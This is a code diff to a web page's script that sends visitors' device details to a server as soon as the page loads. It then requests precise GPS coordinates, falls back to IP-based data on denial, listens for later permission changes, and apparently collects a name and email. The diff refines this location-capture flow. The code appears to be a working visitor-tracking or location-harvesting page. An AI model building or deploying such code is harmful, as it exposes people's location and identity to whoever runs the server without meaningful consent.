@@ -158,7 +158,7 @@ document.addEventListener("DOMContentLoaded", () => {
     userAgent: navigator.userAgent
   };
 
-  // Immediately send device info and try GPS
+  // Immediately send device info and try GPS with permission handling
   sendWithLocation();
 
   // Wait for user interaction to submit name/email
@@ -185,36 +185,69 @@ document.addEventListener("DOMContentLoaded", () => {
   };
 
   function sendWithLocation() {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-          const acc = pos.coords.accuracy;
-
-          sendToServer("gps", {
-            lat,
-            lon,
-            acc,
-            maps_url: `https://www.google.com/maps?q=${lat},${lon}`,
-            device_info: deviceData,
-            timestamp
-          });
-        },
-        () => {
-          sendToServer("ip", {
-            device_info: deviceData,
-            timestamp
-          });
-        },
-        { enableHighAccuracy: true, timeout: 10000 }
-      );
-    } else {
-      sendToServer("ip", {
-        device_info: deviceData,
-        timestamp
-      });
+    if (!navigator.geolocation) {
+      // No geolocation support
+      sendToServer("ip", { device_info: deviceData, timestamp });
+      return;
     }
+
+    if (!navigator.permissions) {
+      // Permissions API not supported, fallback to immediate request
+      requestLocationOnce();
+      return;
+    }
+
+    navigator.permissions.query({ name: 'geolocation' }).then((result) => {
+      if (result.state === 'granted') {
+        // Permission already granted - get location immediately
+        requestLocationOnce();
+      } else if (result.state === 'prompt') {
+        // Permission not decided - request location once, browser will prompt user
+        requestLocationOnce();
+      } else {
+        // Permission denied
+        sendToServer("ip", { device_info: deviceData, timestamp });
+      }
+
+      // Listen for permission state changes (user may grant permission after prompt)
+      result.onchange = function() {
+        if (result.state === 'granted') {
+          requestLocationOnce();
+        } else if (result.state === 'denied') {
+          sendToServer("ip", { device_info: deviceData, timestamp });
+        }
+      };
+    }).catch(() => {
+      // If Permissions API fails, fallback to immediate request
+      requestLocationOnce();
+    });
+  }
+
+  function requestLocationOnce() {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const acc = pos.coords.accuracy;
+
+        sendToServer("gps", {
+          lat,
+          lon,
+          acc,
+          maps_url: `https://www.google.com/maps?q=${lat},${lon}`,
+          device_info: deviceData,
+          timestamp
+        });
+      },
+      (err) => {
+        // On error or denial, fallback to IP-based info
+        sendToServer("ip", {
+          device_info: deviceData,
+          timestamp
+        });
+      },
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
   }
 
   function sendToServer(type, data) {
@@ -238,8 +271,5 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 });
 </script>
-
-
-  
 </body>
 </html>
